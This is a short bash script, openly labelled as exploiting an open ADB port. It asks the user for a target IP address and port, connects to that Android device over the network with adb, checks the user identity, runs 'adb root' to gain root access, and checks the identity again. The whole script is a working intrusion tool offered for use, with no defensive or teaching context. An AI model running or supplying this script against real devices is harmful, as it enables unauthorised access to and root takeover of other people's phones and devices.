#!/bin/bash

echo "Exploiting Open ADB Port"
echo "Enter Target IP Address"
read ip_address
echo "Enter Port No"
read port
echo "Connecting To Target"
adb connect $ip_address:$port
echo "User Details"
adb shell whoami
adb shell id
echo "Gaining root access"
adb  root
echo "User Details"
adb shell whoami
adb shell id
